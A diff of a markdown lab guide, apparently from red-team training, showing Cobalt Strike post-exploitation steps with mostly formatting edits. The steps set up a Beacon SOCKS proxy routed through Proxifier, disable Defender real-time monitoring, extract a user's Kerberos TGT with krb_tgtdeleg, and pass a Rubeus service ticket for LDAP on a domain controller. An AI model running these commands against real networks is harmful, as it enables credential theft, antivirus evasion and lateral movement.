@@ -6,29 +6,29 @@
 
 ## SOCKS
 
-1. Launch Cobalt Strike and connect to the team server.
-2. Interact with a Beacon and start a socks proxy. User `pchilds` beacon.
-   `socks 1080 socks5 `
-3. From the Windows start menu, launch `Profixier`.
-4. It opens minimised in the taskbar, so click it to open the full window.
+1. Launch Cobalt Strike and connect to the team server.  
+2. Interact with a Beacon and start a socks proxy. User `pchilds` beacon.  
+   `socks 1080 socks5 `  
+3. From the Windows start menu, launch `Profixier`.  
+4. It opens minimised in the taskbar, so click it to open the full window.  
 
-### Proxy Server
+### Proxy Server  
 
->Add the team server as a new proxy server:
-    1. **Profile > Proxy Servers**
-    2. Click **Add**.
-    3. Address of the Cobalt Strike server:  `10.0.0.5 `
-    4. Port:  `1080 `
-    5. Protocol: **SOCKS Version 5**
-    6. Click **OK**.
+>Add the team server as a new proxy server:  
+    1. **Profile > Proxy Servers**  
+    2. Click **Add**.  
+    3. Address of the Cobalt Strike server:  `10.0.0.5 `  
+    4. Port:  `1080 `  
+    5. Protocol: **SOCKS Version 5**  
+    6. Click **OK**.  
     
-⚠️ A box will appear asking if you want to use this proxy by default. Click **No**.
+⚠️ A box will appear asking if you want to use this proxy by default. Click **No**.  
 
-    6. Click **OK** again.
+>Click **OK** again.  
     
-⚠️ Another box will appear asking if you want to edit `Proxification Rules`.  Click **Yes**.
+⚠️ Another box will appear asking if you want to edit `Proxification Rules`.  Click **Yes**.  
 
-### Proxification Rules
+### Proxification Rules  
 
 >Add a new rule that will proxy any traffic from any application, on any port destined for the target network, through the team server.
     1. Click **Add**.
@@ -49,23 +49,26 @@
 
 ### Defender
 
-1. Still in the admin Terminal session, on the attacker desktop machine, disable real-time Microsoft Defender Antivirus protection.
-   `Set-MpPreference -DisableRealtimeMonitoring $true `
+1. Still in the admin Terminal session, on the attacker desktop machine, disable real-time Microsoft Defender Antivirus protection.  
+   `Set-MpPreference -DisableRealtimeMonitoring $true`  
 
 ### Current User TGT Credentials
 
 >TGT delegation in low integrity beacon as user `pchilds`  
 >Obtain TGT for the current user running the beacon.  
 
-1. In the medium-integrity Beacon running as `pchilds`, extract their TGT.
-    `krb_tgtdeleg `
+⚠️ Prerequisite: Load BOF aggressor script for `krb_triage` and `krb_dump`  
+>Open > Cobalt Strike > Script Manager > Load > `C:\Tools\Kerbeus-BOF\kerbeus_cs.cna`  
+
+1. In the medium-integrity Beacon running as `pchilds`, extract their TGT.  
+    `krb_tgtdeleg`
     
-2. Copy the returned base64 TGT ticket to clipboard.
+2. Copy the returned base64 TGT ticket to clipboard.  
 
-3. On the Attacker desktop, run a netonly process, that opens new PowerShell window.
-    `runas /netonly /user:CONTOSO\pchilds powershell `
+3. On the Attacker desktop, run a netonly process, that opens new PowerShell window.  
+    `runas /netonly /user:CONTOSO\pchilds powershell`  
 
-4. Request a service ticket for LDAP through the proxy, in the new spawned PowerShell window and paste the above returned based64 TGT ticket in the `Rubeus` command:  
+4. Request a service ticket for LDAP through the proxy, in the new **spawned** PowerShell window and paste the above returned based64 TGT ticket in the `Rubeus` command:  
 
 	```Terminal-nocolor
     C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /ticket:[TGT] /service:ldap/lon-dc-1 /dc:lon-dc-1 /ptt
